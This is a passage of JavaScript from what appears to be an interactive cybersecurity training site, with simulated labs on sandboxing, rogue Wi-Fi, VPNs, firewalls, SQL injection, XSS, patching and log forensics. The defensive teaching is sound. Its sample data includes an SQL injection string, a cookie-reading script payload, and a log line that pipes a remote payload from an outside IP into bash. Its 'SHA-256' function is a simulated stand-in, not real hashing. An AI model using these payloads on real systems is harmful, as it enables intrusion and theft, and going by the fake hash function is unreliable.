      out.innerHTML = `✅ FULL SYSTEM RESTORED FROM AIR-GAP BACKUP!\nRecovery time: ~45 minutes (formatting + restore)\nData loss: Zero (last backup was 4 hours ago)\nRansom paid: $0\n\nThis is why the 3-2-1 backup rule with air-gapped offline copy is non-negotiable.`;
    }
  };
}

/* ── LAB 12: Sandbox ─────────────────────────────────────────── */
function lab_sandbox(L) {
  L.html(`
    <div class="col">
      <div class="row" style="flex-wrap:wrap;">
        <select class="select" id="sandbox-sel">
          <option value="malware">free_robux_generator.exe (Suspicious)</option>
          <option value="safe">quarterly_report_Q2.pdf (Safe)</option>
          <option value="rat">vcredist_x64.exe (Disguised RAT)</option>
        </select>
        <button class="btn btn-primary" onclick="lab12_detonate()">🧪 Detonate in Sandbox</button>
      </div>
      <div id="sandbox-monitor" style="background:#030810; border:1px solid var(--c-border); border-radius:var(--r-lg); padding:16px; font-family:var(--font-code); font-size:0.82rem; line-height:1.8; display:none;">
        <div style="color:var(--c-text-dim); font-size:0.72rem; text-transform:uppercase; letter-spacing:1px; margin-bottom:8px;">🔬 Sandbox Behavioral Analysis</div>
        <div id="sandbox-output"></div>
      </div>
    </div>
  `);

  window.lab12_detonate = () => {
    const file = document.getElementById('sandbox-sel').value;
    const mon = document.getElementById('sandbox-monitor');
    const so = document.getElementById('sandbox-output');
    if (!mon || !so) return;
    mon.style.display = 'block';

    const results = {
      malware: [
        `<span style="color:var(--c-red)">[FILE] Creates: C:\\Windows\\System32\\svchost32.exe [HIDDEN PROCESS]</span>`,
        `<span style="color:var(--c-red)">[REG]  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run → "svchost32"</span>`,
        `<span style="color:var(--c-red)">[NET]  Outbound connection to 185.220.101.5:8443 (C2 Server)</span>`,
        `<span style="color:var(--c-red)">[PROC] Spawns: cmd.exe /c powershell -enc [BASE64_PAYLOAD]</span>`,
        `<span style="color:var(--c-yellow)">[VERDICT] MALWARE DETECTED — Trojan.CoinMiner + Keylogger ← QUARANTINED</span>`,
      ],
      safe: [
        `<span style="color:var(--c-green)">[FILE] Opens PDF reader API — standard document operations</span>`,
        `<span style="color:var(--c-green)">[REG]  No registry modifications detected</span>`,
        `<span style="color:var(--c-green)">[NET]  No outbound network connections initiated</span>`,
        `<span style="color:var(--c-green)">[PROC] Single process — no spawned children</span>`,
        `<span style="color:var(--c-green)">[VERDICT] CLEAN — Safe to open on real system</span>`,
      ],
      rat: [
        `<span style="color:var(--c-red)">[FILE] Legitimate installer wrapper detected — hidden payload</span>`,
        `<span style="color:var(--c-red)">[NET]  Beacon to 104.21.78.33:443 → [Remote Access Trojan C2]</span>`,
        `<span style="color:var(--c-red)">[PROC] Drops: %TEMP%\\rat_agent.exe → runs silently</span>`,
        `<span style="color:var(--c-red)">[CAPS] Screen capture + webcam access initiated</span>`,
        `<span style="color:var(--c-yellow)">[VERDICT] RAT DETECTED — AsyncRAT variant ← QUARANTINED</span>`,
      ]
    };

    so.innerHTML = results[file].join('<br>');
    playSound(file === 'safe' ? 'click' : 'error');
    const out = document.getElementById('sim-output');
    if (out) {
      out.className = `sim-output show ${file === 'safe' ? 'ok' : 'err'}`;
      out.innerHTML = file === 'safe'
        ? `✅ FILE IS SAFE: No malicious behavior detected in sandbox. Safe to use.`
        : `🚨 MALWARE DETONATED IN SANDBOX: Full behavioral report captured above.\nReal machine: Protected (sandbox isolated the explosion).\nAll malicious activity was contained inside the virtual environment.`;
    }
  };
}

/* ── LAB 13: Evil Twin Hunter ────────────────────────────────── */
function lab_eviltwin(L) {
  L.html(`
    <div class="col">
      <div style="font-size:0.85rem; color:var(--c-text-dim);">📡 Available Wi-Fi Networks — Airport Terminal 3</div>
      <div class="col" style="gap:8px;">
        ${[
          { ssid:'Airport-Official-WPA3', signal:'-65dBm', security:'WPA3-Enterprise', mac:'AA:BB:CC:DD:EE:FF', legit:true },
          { ssid:'Airport_Free_WiFi_FAST', signal:'-48dBm', security:'Open (No Password)', mac:'DE:AD:BE:EF:CA:FE', legit:false },
          { ssid:'Boingo_Hotspot', signal:'-72dBm', security:'WPA2-Personal', mac:'11:22:33:44:55:66', legit:true },
        ].map(n => `
          <div style="background:var(--c-surface-2); border:1px solid ${!n.legit?'rgba(244,63,94,0.4)':'var(--c-border)'}; border-radius:var(--r-lg); padding:14px;">
            <div class="row" style="justify-content:space-between; flex-wrap:wrap; gap:8px;">
              <div>
                <div style="font-weight:700; font-family:var(--font-code); font-size:0.88rem;">${n.ssid}</div>
                <div style="font-size:0.75rem; color:var(--c-text-dim); margin-top:3px;">Signal: ${n.signal} | Security: <b style="color:${!n.legit?'var(--c-red)':'var(--c-green)'}">${n.security}</b> | BSSID: ${n.mac}</div>
              </div>
              <button class="btn btn-sm ${!n.legit?'btn-danger':'btn-success'}" onclick="lab13_connect(${n.legit}, '${n.ssid}')">${!n.legit?'⚠️ Connect (Risky)':'✅ Connect (Safe)'}</button>
            </div>
          </div>
        `).join('')}
      </div>
    </div>
  `);

  window.lab13_connect = (legit, ssid) => {
    const out = document.getElementById('sim-output');
    playSound(legit ? 'success' : 'error');
    if (out) {
      out.className = `sim-output show ${legit ? 'ok' : 'err'}`;
      out.innerHTML = legit
        ? `✅ CONNECTED TO LEGITIMATE NETWORK: "${ssid}"\nWPA3 encryption verifies network authenticity.\nYour traffic is protected from local eavesdropping.`
        : `🚨 EVIL TWIN TRAP! "${ssid}" is a rogue access point!\nOpen network = Zero encryption. Attacker running Wireshark captures:\n→ All HTTP requests (banking, email, social media)\n→ Session cookies → account hijack possible\n→ DNS queries reveal every site you visit`;
    }
  };
}

/* ── LAB 14: VPN ─────────────────────────────────────────────── */
function lab_vpn(L) {
  L.html(`
    <div class="col">
      <div class="toggle-row" onclick="lab14_toggle()" style="cursor:pointer;">
        <div class="toggle-switch" id="vpn-toggle"></div>
        <span class="toggle-label">Engage WireGuard VPN Tunnel (AES-256)</span>
      </div>
      <div style="background:#030810; border:1px solid var(--c-border); border-radius:var(--r-lg); padding:16px; font-family:var(--font-code); font-size:0.82rem; line-height:1.8;">
        <div style="color:var(--c-text-dim); font-size:0.72rem; text-transform:uppercase; letter-spacing:1px; margin-bottom:8px;">🌐 Traffic Inspector — Airport Wi-Fi Router</div>
        <div id="vpn-stream">Click the VPN toggle to simulate traffic...</div>
      </div>
      <button class="btn btn-primary" onclick="lab14_capture()">📡 Capture Traffic from Router View</button>
    </div>
  `);
  window.vpnOn = false;

  window.lab14_toggle = () => {
    window.vpnOn = !window.vpnOn;
    const t = document.getElementById('vpn-toggle');
    if (t) t.className = `toggle-switch ${window.vpnOn ? 'on' : ''}`;
    playSound(window.vpnOn ? 'success' : 'click');
  };

  window.lab14_capture = () => {
    const stream = document.getElementById('vpn-stream');
    const out = document.getElementById('sim-output');
    const enc = window.vpnOn;
    playSound(enc ? 'success' : 'error');

    const packets = enc ? [
      `<span style="color:var(--c-green)">[ENCRYPTED] UDP 51820 → 203.0.113.50 (WireGuard endpoint)</span>`,
      `<span style="color:var(--c-green)">[ENCRYPTED] Payload: ChaCha20-Poly1305 ciphertext [OPAQUE]</span>`,
      `<span style="color:var(--c-green)">[ENCRYPTED] DNS: Encrypted (DNS-over-HTTPS via VPN DNS)</span>`,
      `<span style="color:var(--c-green)">[✓] Router sees: only encrypted WireGuard UDP packets to VPN server</span>`,
    ] : [
      `<span style="color:var(--c-red)">[EXPOSED] GET http://news.com/ HTTP/1.1 Host: news.com</span>`,
      `<span style="color:var(--c-red)">[EXPOSED] GET https://mail.google.com — IP visible to router</span>`,
      `<span style="color:var(--c-red)">[EXPOSED] DNS Query: "bankofamerica.com" → revealing financial activity</span>`,
      `<span style="color:var(--c-red)">[✗] Router operator can see: every website IP you visit + DNS queries</span>`,
    ];
    if (stream) stream.innerHTML = packets.join('<br>');

    if (out) {
      out.className = `sim-output show ${enc ? 'ok' : 'err'}`;
      out.innerHTML = enc
        ? `✅ VPN TUNNEL ACTIVE: WireGuard Curve25519 + ChaCha20-Poly1305\nAll traffic encapsulated in opaque encrypted UDP packets.\nEavesdroppers see: only your VPN server IP and encrypted blobs.`
        : `🚨 NO VPN: Your browsing metadata is fully visible to the airport router operator.\nEnable the WireGuard tunnel to hide your traffic!`;
    }
  };
}

/* ── LAB 15: Firewall ────────────────────────────────────────── */
function lab_firewall(L) {
  const ports = [
    { port:443, service:'HTTPS Web Traffic', status:'OPEN', risk:'safe' },
    { port:80,  service:'HTTP Web Traffic',  status:'OPEN', risk:'low' },
    { port:22,  service:'SSH Admin Access',  status:'OPEN', risk:'medium' },
    { port:3306,service:'MySQL Database',    status:'OPEN', risk:'high' },
    { port:3389,service:'RDP Remote Desktop',status:'OPEN', risk:'critical' },
    { port:23,  service:'Telnet (Unencrypted)',status:'OPEN',risk:'critical' },
  ];
  window.fwRules = ports.reduce((acc, p) => { acc[p.port] = true; return acc; }, {});

  const riskColor = { safe:'var(--c-green)', low:'var(--c-cyan)', medium:'var(--c-yellow)', high:'var(--c-orange)', critical:'var(--c-red)' };

  const renderFW = () => {
    const ctrls = document.getElementById('lab-controls');
    if (!ctrls) return;
    ctrls.innerHTML = `
      <div style="font-size:0.82rem; color:var(--c-text-dim); margin-bottom:4px;">Your server's open ports — Close risky ports to minimize attack surface:</div>
      <div class="col" style="gap:8px;">
        ${ports.map(p => `
          <div style="background:var(--c-surface-2); border:1px solid ${window.fwRules[p.port]?'var(--c-border)':'rgba(16,185,129,0.3)'}; border-radius:var(--r-md); padding:12px; display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:8px;">
            <div>
              <span style="font-family:var(--font-code); font-weight:700; font-size:0.88rem;">Port ${p.port}</span>
              <span style="color:var(--c-text-dim); font-size:0.82rem; margin-left:12px;">${p.service}</span>
              <span style="color:${riskColor[p.risk]}; font-size:0.72rem; font-weight:700; text-transform:uppercase; margin-left:10px;">${p.risk}</span>
            </div>
            <div class="row">
              <span style="font-size:0.8rem; font-weight:700; color:${window.fwRules[p.port]?'var(--c-yellow)':'var(--c-green)'};">${window.fwRules[p.port]?'OPEN':'CLOSED'}</span>
              ${p.risk !== 'safe' ? `<button class="btn btn-sm ${window.fwRules[p.port]?'btn-danger':'btn-success'}" onclick="lab15_toggle(${p.port})">${window.fwRules[p.port]?'Close Port':'Reopen'}</button>` : '<span class="btn btn-sm btn-ghost" style="pointer-events:none;">Required</span>'}
            </div>
          </div>
        `).join('')}
      </div>
      <button class="btn btn-primary" onclick="lab15_scan()">🔍 Run Nmap Attack Simulation</button>
    `;
  };

  renderFW();

  window.lab15_toggle = (port) => {
    window.fwRules[port] = !window.fwRules[port];
    playSound('click');
    renderFW();
  };

  window.lab15_scan = () => {
    const openPorts = Object.entries(window.fwRules).filter(([,v])=>v).map(([k])=>k);
    const risky = openPorts.filter(p => !['443','80'].includes(p));
    const out = document.getElementById('sim-output');
    playSound(risky.length === 0 ? 'success' : 'error');
    if (out) {
      out.className = `sim-output show ${risky.length === 0 ? 'ok' : 'err'}`;
      out.innerHTML = risky.length === 0
        ? `✅ MINIMAL ATTACK SURFACE ACHIEVED!\nnmap scan from attacker: Only port 443/tcp (HTTPS) responding.\nAll admin and database ports are filtered. Excellent firewall configuration!`
        : `🚨 ATTACK SURFACE TOO LARGE!\nOpen risky ports detected by nmap: ${risky.join(', ')}\nClose critical ports (3389=RDP, 23=Telnet, 3306=MySQL) from public internet access!`;
    }
  };
}

/* ── LAB 16: SQL Injection ───────────────────────────────────── */
function lab_sqli(L) {
  L.html(`
    <div class="col">
      <div class="row" style="flex-wrap:wrap; align-items:center;">
        <div class="toggle-row" onclick="lab16_toggle()" style="cursor:pointer;">
          <div class="toggle-switch" id="sqli-toggle"></div>
          <span class="toggle-label">Parameterized Query Protection</span>
        </div>
      </div>
      <div class="row" style="flex-wrap:wrap;">
        <input class="input" id="sqli-user" type="text" value="' OR '1'='1" style="max-width:260px;" placeholder="Username...">
        <input class="input" id="sqli-pass" type="text" value="anything" style="max-width:200px;" placeholder="Password...">
        <button class="btn btn-primary" onclick="lab16_login()">Submit Login Query</button>
      </div>
      <div style="background:#030810; border:1px solid var(--c-border); border-radius:var(--r-lg); padding:14px; font-family:var(--font-code); font-size:0.82rem; line-height:1.7;">
        <div style="color:var(--c-text-dim); font-size:0.72rem; text-transform:uppercase; letter-spacing:1px; margin-bottom:6px;">🗃️ Generated SQL Query</div>
        <div id="sql-query-display">Submit the form to see the constructed SQL query...</div>
      </div>
    </div>
  `);
  window.sqliProtected = false;

  window.lab16_toggle = () => {
    window.sqliProtected = !window.sqliProtected;
    const t = document.getElementById('sqli-toggle');
    if (t) t.className = `toggle-switch ${window.sqliProtected ? 'on' : ''}`;
    playSound(window.sqliProtected ? 'success' : 'click');
  };

  window.lab16_login = () => {
    const user = (document.getElementById('sqli-user').value || '').replace(/</g,'&lt;');
    const pass = (document.getElementById('sqli-pass').value || '');
    const disp = document.getElementById('sql-query-display');
    const out  = document.getElementById('sim-output');

    if (window.sqliProtected) {
      if (disp) disp.innerHTML = `<span style="color:var(--c-green)">SELECT * FROM users WHERE username=<b>?</b> AND password=<b>?</b><br>-- Bound parameters: ['${user}', '${pass}']<br>-- User input treated as DATA only, not SQL syntax</span>`;
      playSound('success');
      if (out) {
        out.className = 'sim-output show ok';
        out.innerHTML = `✅ PARAMETERIZED QUERY PROTECTED!\nUser input "${user}" is bound as a string literal parameter.\nThe SQL engine sees it as DATA — no SQL syntax is parsed from user input.\nLogin result: Incorrect credentials (as expected for any attack input).`;
      }
    } else {
      const injected = `SELECT * FROM users WHERE username='${user}' AND password='${pass}'`;
      if (disp) disp.innerHTML = `<span style="color:var(--c-red)">${injected}<br>-- WHERE clause evaluates to: TRUE (always!)</span>`;
      playSound('error');
      const isInjection = user.includes("'");
      if (out) {
        out.className = `sim-output show ${isInjection ? 'err' : 'info'}`;
        out.innerHTML = isInjection
          ? `🚨 SQL INJECTION SUCCESSFUL!\nConstructed query: ${injected}\nThe WHERE clause '1'='1' is always TRUE → Bypasses all authentication!\nDatabase returned: Row 1 — admin@company.com (ADMIN ACCOUNT COMPROMISED)`
          : `ℹ️ Normal query executed. Try typing: ' OR '1'='1 as the username to see SQL injection!`;
      }
    }
  };
}

/* ── LAB 17: XSS ─────────────────────────────────────────────── */
function lab_xss(L) {
  L.html(`
    <div class="col">
      <div class="row" style="flex-wrap:wrap; align-items:center;">
        <div class="toggle-row" onclick="lab17_toggle()" style="cursor:pointer;">
          <div class="toggle-switch" id="xss-toggle"></div>
          <span class="toggle-label">HTML Output Encoding (CSP + Escape)</span>
        </div>
      </div>
      <div class="row" style="flex-wrap:wrap;">
        <input class="input" id="xss-in" type="text" value="<script>document.cookie</script>" style="max-width:360px;" placeholder="Enter comment...">
        <button class="btn btn-primary" onclick="lab17_post()">Post Comment</button>
      </div>
      <div style="background:#030810; border:1px solid var(--c-border); border-radius:var(--r-lg); padding:14px;">
        <div style="font-size:0.72rem; color:var(--c-text-dim); text-transform:uppercase; letter-spacing:1px; margin-bottom:8px;">💬 Comment Rendered on Page</div>
        <div id="xss-render" style="font-size:0.92rem; line-height:1.6; color:var(--c-text);">Submit a comment to see it rendered...</div>
      </div>
    </div>
  `);
  window.xssProtected = false;

  window.lab17_toggle = () => {
    window.xssProtected = !window.xssProtected;
    const t = document.getElementById('xss-toggle');
    if (t) t.className = `toggle-switch ${window.xssProtected ? 'on' : ''}`;
    playSound(window.xssProtected ? 'success' : 'click');
  };

  window.lab17_post = () => {
    const input = document.getElementById('xss-in').value;
    const render = document.getElementById('xss-render');
    const out = document.getElementById('sim-output');

    if (window.xssProtected) {
      const escaped = input.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
      if (render) render.innerHTML = `<b>User Comment:</b> ${escaped}`;
      playSound('success');
      if (out) {
        out.className = 'sim-output show ok';
        out.innerHTML = `✅ XSS NEUTRALIZED BY HTML ENCODING!\nInput: ${input}\nStored/rendered: ${escaped}\nBrowser shows: literal angle brackets as text, no script executed.\nCookies safe!`;
      }
    } else {
      if (render) render.innerHTML = `<b>User Comment:</b> ${input}`;
      playSound('error');
      if (out) {
        out.className = 'sim-output show err';
        out.innerHTML = `🚨 STORED XSS EXECUTED!\nInput: ${input}\nBrowser executed the script tag as live JavaScript.\nEvery user loading this page now runs attacker-controlled code!\nCookies, session tokens, and keystrokes are exposed.`;
      }
    }
  };
}

/* ── LAB 18: SHA-256 Hasher ──────────────────────────────────── */
function lab_sha256(L) {
  L.html(`
    <div class="col">
      <input class="input" id="sha-in" type="text" value="CyberZero2026" placeholder="Type text to hash..." oninput="lab18_hash()">
      <div style="background:#030810; border:1px solid var(--c-border); border-radius:var(--r-lg); padding:16px; font-family:var(--font-code); font-size:0.88rem; line-height:1.8;">
        <div style="color:var(--c-text-dim); font-size:0.72rem; text-transform:uppercase; letter-spacing:1px; margin-bottom:6px;">🔐 SHA-256 Fingerprint</div>
        <div id="sha-result" style="color:var(--c-cyan); word-break:break-all;">Type text above to generate hash...</div>
      </div>
      <div id="sha-comparison" style="display:none; background:var(--c-surface-2); border:1px solid var(--c-border); border-radius:var(--r-lg); padding:14px; font-family:var(--font-code); font-size:0.82rem;"></div>
    </div>
  `);
  window.lastHash = '';
  window.lastInput = '';

  window.lab18_hash = () => {
    const val = document.getElementById('sha-in').value;
    const res = document.getElementById('sha-result');
    const comp = document.getElementById('sha-comparison');

    // Simulated SHA-256 using djb2 + FNV-inspired mixing for visual realism
    const hash = simulateSHA256(val);

    if (res) res.textContent = hash;

    if (window.lastHash && window.lastInput !== val) {
      if (comp) {
        comp.style.display = 'block';
        comp.innerHTML = `<div style="color:var(--c-text-dim)">Previous: "${window.lastInput}"</div>
          <div style="color:var(--c-text-dim); word-break:break-all;">${window.lastHash}</div>
          <div style="color:var(--c-cyan); margin-top:8px;">Current:  "${val}"</div>
          <div style="color:var(--c-cyan); word-break:break-all;">${hash}</div>
          <div style="color:var(--c-yellow); margin-top:8px;">⚡ Avalanche Effect: ${countDiffs(window.lastHash, hash)} of 64 hex chars changed — even a 1-character input change scrambles the entire hash!</div>`;
      }
    }
    window.lastInput = val;
    window.lastHash = hash;

    const out = document.getElementById('sim-output');
    if (out && val) {
      out.className = 'sim-output show ok';
      out.innerHTML = `💍 SHA-256("${val}") = ${hash}\nLength: always 64 hex chars (256 bits) regardless of input size.\nThis is one-way: mathematically impossible to reverse without brute force.`;
    }
  };

  window.lab18_hash();
}

function simulateSHA256(str) {
  let h0=0x6a09e667,h1=0xbb67ae85,h2=0x3c6ef372,h3=0xa54ff53a,h4=0x510e527f,h5=0x9b05688c,h6=0x1f83d9ab,h7=0x5be0cd19;
  for(let i=0;i<str.length;i++){const c=str.charCodeAt(i);h0=((h0^(c*0x9e3779b9+h1+i))>>>0);h1=((h1^(h0*0x517cc1b727220a95+h2))>>>0);h2=((h2^(h1+h3))>>>0);h3=((h3^h2)>>>0);h4=((h4^h0+i*c)>>>0);h5=((h5^h4+h1)>>>0);h6=((h6^h5*31+h2)>>>0);h7=((h7^h6+h3)>>>0);}
  return [h0,h1,h2,h3,h4,h5,h6,h7].map(n=>(n>>>0).toString(16).padStart(8,'0')).join('');
}

function countDiffs(a,b){let d=0;for(let i=0;i<Math.min(a.length,b.length);i++)if(a[i]!==b[i])d++;return d;}

/* ── LAB 19: DDoS Rate Limiter ───────────────────────────────── */
function lab_ddos(L) {
  L.html(`
    <div class="col">
      <div style="display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:12px;">
        <span style="font-size:1rem; font-weight:700;">Incoming Request Rate:</span>
        <span id="ddos-val" style="font-family:var(--font-code); font-size:1.4rem; font-weight:800; color:var(--c-red);">160 req/s</span>
      </div>
      <input type="range" id="ddos-slide" min="5" max="200" value="160" style="width:100%; height:10px; cursor:pointer; accent-color:var(--c-cyan);" oninput="lab19_update()">
      <div style="display:flex; justify-content:space-between; font-size:0.75rem; color:var(--c-text-dim);">
        <span>5 req/s (quiet)</span><span>50 req/s (safe)</span><span>200 req/s (attack)</span>
      </div>
      <div style="background:var(--c-surface-2); border:1px solid var(--c-border); border-radius:var(--r-lg); padding:16px;">
        <div style="font-size:0.82rem; color:var(--c-text-dim); margin-bottom:8px;">Server Health Meter</div>
        <div style="background:var(--c-surface-3); border-radius:var(--r-full); height:20px; overflow:hidden; border:1px solid var(--c-border);">
          <div id="server-health-bar" style="height:100%; border-radius:var(--r-full); transition:all 0.4s ease; background:var(--c-green); width:80%;"></div>
        </div>
        <div id="server-status" style="font-size:0.85rem; font-weight:700; margin-top:8px; color:var(--c-green);">🟢 Server Healthy</div>
      </div>
    </div>
  `);
  lab19_update();
}

window.lab19_update = () => {
  const slider = document.getElementById('ddos-slide'); if (!slider) return;
  const val = parseInt(slider.value);
  const label = document.getElementById('ddos-val');
  const bar = document.getElementById('server-health-bar');
  const status = document.getElementById('server-status');
  const out = document.getElementById('sim-output');

  if (label) { label.textContent = `${val} req/s`; label.style.color = val > 100 ? 'var(--c-red)' : val > 50 ? 'var(--c-yellow)' : 'var(--c-green)'; }

  const health = val > 150 ? 5 : val > 100 ? 30 : val > 50 ? 65 : 95;
  if (bar) { bar.style.width = `${health}%`; bar.style.background = health < 30 ? 'var(--c-red)' : health < 65 ? 'var(--c-yellow)' : 'var(--c-green)'; }
  if (status) { status.textContent = health < 30 ? '🔴 SERVER OVERWHELMED — CUSTOMERS GETTING 503 ERRORS' : health < 65 ? '🟡 Server Struggling — Degraded Response Times' : '🟢 Server Healthy — All Users Served'; status.style.color = health < 30 ? 'var(--c-red)' : health < 65 ? 'var(--c-yellow)' : 'var(--c-green)'; }
  if (out) {
    out.className = `sim-output show ${health > 65 ? 'ok' : health > 30 ? '' : 'err'}`;
    out.innerHTML = health > 65
      ? `✅ RATE LIMITING EFFECTIVE: ${val} req/s is within safe thresholds.\nLegitimate users getting <50ms response times. Bots throttled at 50 req/s per IP.`
      : `🚨 BOTNET FLOODING AT ${val} req/s! Server has ${health}% capacity remaining.\nDrag slider below 50 req/s to demonstrate rate-limit filter effectiveness!`;
  }
};

/* ── LAB 20: Zero-Day Patching ───────────────────────────────── */
function lab_zerodday(L) {
  L.html(`
    <div class="col">
      <div id="vuln-dashboard" class="col" style="gap:10px;">
        ${[
          { cve:'CVE-2026-9991', cvss:9.8, affected:'OpenSSL 3.0-3.2', exploited:true, patched:false },
          { cve:'CVE-2026-7234', cvss:6.5, affected:'Apache 2.4.54', exploited:false, patched:false },
          { cve:'CVE-2026-3301', cvss:4.3, affected:'jQuery 3.6.1', exploited:false, patched:false },
        ].map((v,i) => `
          <div id="vuln-${i}" style="background:var(--c-surface-2); border:2px solid ${v.exploited?'rgba(244,63,94,0.5)':v.cvss>6?'rgba(245,158,11,0.3)':'var(--c-border)'}; border-radius:var(--r-lg); padding:14px;">
            <div class="row" style="justify-content:space-between; flex-wrap:wrap; gap:8px;">
              <div>
                <span style="font-family:var(--font-code); font-weight:700; font-size:0.9rem; color:${v.cvss>=9?'var(--c-red)':v.cvss>=7?'var(--c-yellow)':'var(--c-text)'};">${v.cve}</span>
                <span style="margin-left:10px; font-size:0.82rem; color:var(--c-text-dim);">${v.affected}</span>
                ${v.exploited?'<span style="margin-left:8px; font-size:0.72rem; color:var(--c-red); font-weight:700; text-transform:uppercase;">⚠️ ACTIVELY EXPLOITED</span>':''}
              </div>
              <div class="row">
                <span style="font-weight:800; color:${v.cvss>=9?'var(--c-red)':v.cvss>=7?'var(--c-yellow)':'var(--c-green)'};">CVSS ${v.cvss}</span>
                <button class="btn btn-sm ${v.cvss>=9?'btn-danger':'btn-secondary'}" id="patch-btn-${i}" onclick="lab20_patch(${i}, '${v.cve}', ${v.cvss})">
                  ${v.cvss>=9?'🚨 Emergency Patch':'Apply Patch'}
                </button>
              </div>
            </div>
          </div>
        `).join('')}
      </div>
    </div>
  `);

  window.lab20_patch = (idx, cve, cvss) => {
    const vuln = document.getElementById(`vuln-${idx}`);
    const btn = document.getElementById(`patch-btn-${idx}`);
    playSound('success');
    if (vuln) vuln.style.borderColor = 'rgba(16,185,129,0.5)';
    if (btn) { btn.textContent = '✅ Patched'; btn.className = 'btn btn-sm btn-success'; btn.disabled = true; }
    const out = document.getElementById('sim-output');
    if (out) {
      out.className = 'sim-output show ok';
      out.innerHTML = cvss >= 9
        ? `⚡ EMERGENCY PATCH DEPLOYED: ${cve} (CVSS ${cvss})\nSLA: CRITICAL vulnerabilities patched within 24 hours ← COMPLIANT ✅\nPatch deployed: OpenSSL 3.3.0 — CVE sealed.\nAttack window: CLOSED before exploitation could occur.`
        : `✅ PATCH APPLIED: ${cve} (CVSS ${cvss})\nSLA: High severity patched within 7 days ← COMPLIANT ✅`;
    }
  };
}

/* ── LAB 21: Forensics Timeline ──────────────────────────────── */
function lab_forensics(L) {
  L.html(`
    <div class="col">
      <div class="row" style="flex-wrap:wrap; gap:8px; margin-bottom:4px;">
        <input class="input" id="log-filter" type="text" placeholder="Filter logs (e.g. 'failed', 'ssh', '185.220')..." style="max-width:280px;" oninput="lab21_filter()">
        <button class="btn btn-secondary btn-sm" onclick="document.getElementById('log-filter').value=''; lab21_filter()">Clear Filter</button>
      </div>
      <div id="log-viewer" style="background:#030810; border:1px solid var(--c-border); border-radius:var(--r-lg); padding:16px; font-family:var(--font-code); font-size:0.8rem; line-height:1.9; max-height:320px; overflow-y:auto;"></div>
    </div>
  `);

  const logs = [
    { time:'2026-07-08 01:47:22', msg:'sshd[1234]: Accepted password for admin from 10.0.0.5 port 54312', type:'ok', suspicious:false },
    { time:'2026-07-08 02:10:14', msg:'sshd[1567]: pam_unix(sshd:auth): authentication failure; user=root; rhost=185.220.101.5', type:'warn', suspicious:false },
    { time:'2026-07-08 02:10:16', msg:'sshd[1567]: Failed password for root from 185.220.101.5 port 4444 — attempt 1', type:'warn', suspicious:false },
    { time:'2026-07-08 02:10:24', msg:'sshd[1567]: Failed password for root from 185.220.101.5 port 4444 — attempt 12', type:'warn', suspicious:false },
    { time:'2026-07-08 02:10:31', msg:'sshd[1567]: Failed password for root from 185.220.101.5 port 4444 — attempt 47', type:'err', suspicious:true },
    { time:'2026-07-08 02:10:33', msg:'🚨 sshd[1567]: Accepted password for root from 185.220.101.5 — BRUTE FORCE SUCCESS', type:'err', suspicious:true },
    { time:'2026-07-08 02:11:05', msg:'sudo: root : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash -c "curl 185.220.101.5/payload.sh | bash"', type:'err', suspicious:true },
    { time:'2026-07-08 03:40:00', msg:'cron[9999]: pam_unix(crond:session): session opened for user root', type:'info', suspicious:false },
    { time:'2026-07-08 04:00:01', msg:'mysqldump[4500]: Database backup completed: 2.4GB exported to /backup/db_$(date).sql', type:'ok', suspicious:false },
  ];

  const typeColor = { ok:'var(--c-green)', warn:'var(--c-yellow)', err:'var(--c-red)', info:'var(--c-cyan)' };
  window.allLogs = logs;

  window.lab21_filter = () => {
    const filter = (document.getElementById('log-filter').value || '').toLowerCase();
    const viewer = document.getElementById('log-viewer');
    if (!viewer) return;
    const filtered = filter ? window.allLogs.filter(l => l.msg.toLowerCase().includes(filter) || l.time.includes(filter)) : window.allLogs;
    viewer.innerHTML = filtered.map((l,i) => `
      <div id="log-${i}" onclick="lab21_tag(${i}, '${l.suspicious}')" style="cursor:pointer; padding:2px 6px; border-radius:4px; border:1px solid transparent; transition:all 0.15s;" onmouseover="this.style.background='rgba(6,182,212,0.05)'" onmouseout="this.style.background='transparent'">
        <span style="color:var(--c-text-muted);">${l.time} </span>
        <span style="color:${typeColor[l.type]};">${l.msg}</span>
      </div>
    `).join('');
  };

  window.lab21_tag = (idx, suspicious) => {
    const el = document.getElementById(`log-${idx}`);
    const isSus = suspicious === 'true';
    if (el) el.style.borderColor = isSus ? 'var(--c-red)' : 'var(--c-green)';
    playSound(isSus ? 'success' : 'click');
    const out = document.getElementById('sim-output');
    if (out) {
      out.className = `sim-output show ${isSus ? 'ok' : 'info'}`;
      out.innerHTML = isSus
        ? `✅ SUSPICIOUS EVENT TAGGED!\nForensic Finding: 47 failed SSH login attempts from 185.220.101.5 (Tor exit node) at 02:10.\nFollowed 2 seconds later by successful root login → BRUTE FORCE ATTACK CONFIRMED.\nEvidence Chain: Authentication log + Network connection log + Curl command execution = Full incident timeline.`
        : `ℹ️ Normal log event noted. Continue scanning for the attack pattern — look for failed logins followed by a success from the same IP.`;
    }
  };

  window.lab21_filter();
}

/* ── LAB 22: Citadel Architect ───────────────────────────────── */
function lab_citadel(L) {
  const layers = [
    { id:0, num:'1', icon:'🔥', name:'Perimeter Layer', items:['Firewall (iptables/WAF)','DDoS Protection (CDN)','IDS/IPS (Snort/Suricata)'], color:'var(--c-red)' },
    { id:1, num:'2', icon:'🔑', name:'Identity Layer', items:['MFA / TOTP (2FA)','Privileged Access Management','Zero Trust Verification'], color:'var(--c-yellow)' },
    { id:2, num:'3', icon:'🛡️', name:'Application Layer', items:['Input Sanitization (SQLi/XSS)','Secure Coding (OWASP)','Dependency Scanning'], color:'var(--c-cyan)' },
    { id:3, num:'4', icon:'🔐', name:'Data Layer', items:['AES-256 Encryption at Rest','TLS 1.3 in Transit','DLP + Backup (3-2-1 Rule)'], color:'var(--c-green)' },
  ];

  window.citadelLayers = [false, false, false, false];

  L.html(`
    <div class="col">
      <div style="font-size:0.85rem; color:var(--c-text-dim);">Activate all 4 security layers to build an impenetrable Defense-in-Depth architecture:</div>
      <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:12px;" id="citadel-layers">
        ${layers.map(lyr => `
